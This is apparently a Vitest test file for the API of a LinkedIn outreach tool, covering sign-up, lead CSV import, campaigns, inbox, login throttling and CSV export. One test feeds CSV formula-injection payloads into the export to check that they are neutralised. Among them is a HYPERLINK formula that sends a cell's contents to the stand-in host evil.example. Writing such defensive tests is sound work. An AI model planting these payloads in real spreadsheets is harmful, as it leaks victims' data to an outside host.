import { parse as parseCsv } from 'csv-parse/sync';
import { describe, expect, it } from 'vitest';
import { DAY } from '../src/clock.js';
import { buildApp } from '../src/app.js';
import { Engine } from '../src/engine/engine.js';
import { csvToLeads } from '../src/routes/leads.js';
import { csvCell } from '../src/http.js';
import { makeWorld, runFor } from './helpers.js';

async function setup() {
  const w = makeWorld({ acceptRate: 1, replyRate: 1, acceptHours: [1, 3], replyHours: [1, 3] });
  // makeWorld seeds a workspace directly; the API test registers its own through HTTP.
  w.ctx.db.run('DELETE FROM workspaces');
  const app = await buildApp(w.ctx);
  let cookie = '';
  const call = async (method: string, url: string, payload?: unknown) => {
    const res = await app.inject({ method: method as any, url, payload: payload as any, headers: cookie ? { cookie } : {} });
    const set = res.headers['set-cookie'];
    if (set) cookie = (Array.isArray(set) ? set[0] : set).split(';')[0];
    return { status: res.statusCode, body: res.headers['content-type']?.includes('json') ? res.json() : res.body };
  };
  return { w, app, call, engine: new Engine(w.ctx) };
}

describe('HTTP API', () => {
  it('requires a session', async () => {
    const { call } = await setup();
    expect((await call('GET', '/api/campaigns')).status).toBe(401);
    expect((await call('GET', '/api/auth/status')).body).toEqual({ needsSetup: true, allowSignup: true, setupTokenRequired: false });
  });

  it('runs the whole flow: sign up, account, CSV import, campaign, inbox, analytics, export', async () => {
    const { w, call } = await setup();
    const reg = await call('POST', '/api/auth/register', { name: 'Ana', email: 'ana@example.com', password: 'correct-horse', workspace: 'Acme' });
    expect(reg.status).toBe(200);

    const acc = await call('POST', '/api/accounts', { name: 'Demo seat', driver: 'simulator', timezone: 'UTC', warmup: false, delayMinSec: 30, delayMaxSec: 60 });
    expect(acc.status).toBe(200);
    expect(acc.body.hasSession).toBe(false);
    expect((await call('POST', `/api/accounts/${acc.body.id}/check`)).body.ok).toBe(true);

    const list = await call('POST', '/api/lists', { name: 'Founders' });
    const csv = 'Full Name,LinkedIn URL,Company,Favourite Tool\nJane Roe,https://www.linkedin.com/in/jane-roe/,Acme,Notion\nJohn Poe,linkedin.com/in/john-poe,Globex,Figma\nBad Row,https://example.com/x,Nope,\n';
    const imp = await call('POST', '/api/leads/import/csv', { listId: list.body.id, csv });
    expect(imp.body).toMatchObject({ rows: 3, added: 2, invalid: 1, duplicates: 0 });

    const leads = await call('GET', `/api/leads?listId=${list.body.id}`);
    expect(leads.body.total).toBe(2);
    expect(leads.body.items.find((l: any) => l.publicId === 'jane-roe')).toMatchObject({ firstName: 'Jane', lastName: 'Roe', custom: { favouriteTool: 'Notion' } });

    const camp = await call('POST', '/api/campaigns', { name: 'Founders Q1', accountId: acc.body.id });
    expect(camp.body.problems).toEqual([]);
    const preview = await call('POST', '/api/templates/preview', { template: 'Hi {{firstName}}, love {{favouriteTool}}', leadId: leads.body.items[0].id });
    expect(preview.body.unknown).toEqual([]);

    const added = await call('POST', `/api/campaigns/${camp.body.id}/leads`, { listId: list.body.id });
    expect(added.body.added).toBe(2);
    expect((await call('POST', `/api/campaigns/${camp.body.id}/start`)).body.status).toBe('active');

    await runFor(w, 6 * DAY, 5 * 60_000);

    const detail = await call('GET', `/api/campaigns/${camp.body.id}`);
    expect(detail.body.stats.funnel).toMatchObject({ invited: 2, accepted: 2, replied: 2 });
    expect(detail.body.stats.replied).toBe(2);

    const inbox = await call('GET', '/api/inbox');
    expect(inbox.body).toHaveLength(2);
    expect(inbox.body[0].unread).toBe(1);
    const thread = await call('GET', `/api/inbox/${inbox.body[0].id}`);
    expect(thread.body.messages.map((m: any) => m.direction)).toEqual(['out', 'in']);
    expect((await call('POST', `/api/inbox/${inbox.body[0].id}/reply`, { text: 'Great, talk soon!' })).body.ok).toBe(true);

    const analytics = await call('GET', '/api/analytics?days=7');
    expect(analytics.body.funnel).toMatchObject({ invited: 2, accepted: 2, replied: 2 });
    expect(analytics.body.replyRate).toBe(100);

    const exported = await call('GET', `/api/leads/export.csv?campaignId=${camp.body.id}`);
    expect(String(exported.body).split('\n')[0]).toContain('custom_favouriteTool');
    expect(String(exported.body)).toContain('connected');
  });

  it('rejects invalid sequences when starting', async () => {
    const { call } = await setup();
    await call('POST', '/api/auth/register', { name: 'Ana', email: 'ana@example.com', password: 'correct-horse' });
    const acc = await call('POST', '/api/accounts', { name: 'Seat', driver: 'simulator' });
    const camp = await call('POST', '/api/campaigns', {
      name: 'Broken',
      accountId: acc.body.id,
      sequence: { start: 'a', nodes: { a: { id: 'a', type: 'condition', kind: 'accepted_within', yes: null, no: null } } },
    });
    const start = await call('POST', `/api/campaigns/${camp.body.id}/start`);
    expect(start.status).toBe(400);
    expect(start.body.error).toMatch(/Connect step/);
  });

  it('keeps workspaces apart and closes sign-up after the first user', async () => {
    const { call, w } = await setup();
    await call('POST', '/api/auth/register', { name: 'Ana', email: 'ana@example.com', password: 'correct-horse' });
    w.ctx.config.allowSignup = false;
    const second = await call('POST', '/api/auth/register', { name: 'Eve', email: 'eve@example.com', password: 'correct-horse' });
    expect(second.status).toBe(403);
    const added = await call('POST', '/api/team', { name: 'Bo', email: 'bo@example.com', password: 'correct-horse' });
    expect(added.status).toBe(200);
    expect((await call('GET', '/api/team')).body).toHaveLength(2);
  });

  it('requires the setup token for the first account when one is configured', async () => {
    const { call, w } = await setup();
    w.ctx.config.setupToken = 's3cret-token';
    expect((await call('GET', '/api/auth/status')).body.setupTokenRequired).toBe(true);
    const base = { name: 'Ana', email: 'ana@example.com', password: 'correct-horse' };
    expect((await call('POST', '/api/auth/register', base)).status).toBe(403);
    expect((await call('POST', '/api/auth/register', { ...base, setupToken: 'wrong' })).status).toBe(403);
    expect((await call('POST', '/api/auth/register', { ...base, setupToken: 's3cret-token' })).status).toBe(200);
  });

  it('throttles repeated failed logins, counting them in the database so every instance sees them', async () => {
    const { call, w } = await setup();
    await call('POST', '/api/auth/register', { name: 'Ana', email: 'ana@example.com', password: 'correct-horse' });
    for (let i = 0; i < 10; i++) expect((await call('POST', '/api/auth/login', { email: 'ANA@example.com', password: 'wrong' })).status).toBe(401);
    expect(w.ctx.db.all('SELECT throttle_key, failures FROM login_failures')).toEqual([{ throttle_key: 'ana@example.com|127.0.0.1', failures: 10 }]);
    expect((await call('POST', '/api/auth/login', { email: 'ana@example.com', password: 'correct-horse' })).status).toBe(429);
    // A second app on the same database (another instance) is locked out too.
    const other = await buildApp(w.ctx);
    expect((await other.inject({ method: 'POST', url: '/api/auth/login', payload: { email: 'ana@example.com', password: 'correct-horse' } })).statusCode).toBe(429);
    // The window ends: failures start again from one, and a success clears them.
    w.ctx.db.run('UPDATE login_failures SET expires_at = ?', [Date.now() - 1]);
    expect((await call('POST', '/api/auth/login', { email: 'ana@example.com', password: 'wrong' })).status).toBe(401);
    expect(w.ctx.db.get('SELECT failures FROM login_failures')).toEqual({ failures: 1 });
    expect((await call('POST', '/api/auth/login', { email: 'ana@example.com', password: 'correct-horse' })).status).toBe(200);
    expect(w.ctx.db.get('SELECT COUNT(*) AS n FROM login_failures')).toEqual({ n: 0 });
  });

  it('exports CSV that spreadsheets read as text, with custom fields in their own columns', async () => {
    const { call } = await setup();
    await call('POST', '/api/auth/register', { name: 'Ana', email: 'ana@example.com', password: 'correct-horse' });
    const list = await call('POST', '/api/lists', { name: 'L' });
    const lead = await call('POST', '/api/leads', { listId: list.body.id, profileUrl: 'https://www.linkedin.com/in/evil/', email: 'real@acme.com' });
    // A scraped headline is whatever the person typed into LinkedIn.
    const patch = await call('PATCH', `/api/leads/${lead.body.id}`, {
      firstName: '=HYPERLINK("http://evil.example/?x="&A2,"click")',
      headline: '@SUM(1+1)',
      company: '\t-2+3',
      custom: { 'a,b': 'x', email: 'spoof@evil.example', '=cmd': '+1' },
    });
    expect(patch.status).toBe(200);
    const exported = String((await call('GET', `/api/leads/export.csv?listId=${list.body.id}`)).body);
    const [header, row] = exported.split('\n');
    expect(header).toContain('email,');
    expect(header).toContain('"custom_a,b",custom_email,custom_=cmd');
    expect(row).toContain('"\'=HYPERLINK(""http://evil.example/?x=""&A2,""click"")"');
    expect(row).toContain(",'@SUM(1+1),");
    expect(row).toContain(",'\t-2+3,");
    expect(row).toContain(',real@acme.com,');
    expect(row).toContain(",x,spoof@evil.example,'+1");
    // No cell starts with a formula character, and header and rows have the same number of columns.
    const [head, cells] = parseCsv(exported) as string[][];
    expect(cells).toHaveLength(head.length);
    expect(cells.filter((c) => /^[=+\-@\t\r]/.test(c))).toEqual([]);
    expect(csvCell('-5')).toBe("'-5");
    expect(csvCell('\rx')).toBe(`"'\rx"`);
    expect(csvCell('plain')).toBe('plain');

    // Importing the export gives custom fields their names back.
    const back = csvToLeads(exported);
    expect(back[0].custom).toMatchObject({ email: 'spoof@evil.example', aB: 'x' });
    expect(back[0].email).toBe('real@acme.com');
  });

  it('maps common CSV headers', () => {
    const rows = csvToLeads('﻿First Name,Last Name,Profile URL,Job Title,Email Address,Tags\nA,B,https://linkedin.com/in/ab,CEO,a@b.co,vip;warm\n');
    expect(rows[0]).toMatchObject({ firstName: 'A', lastName: 'B', title: 'CEO', email: 'a@b.co', tags: ['vip', 'warm'] });
  });
});
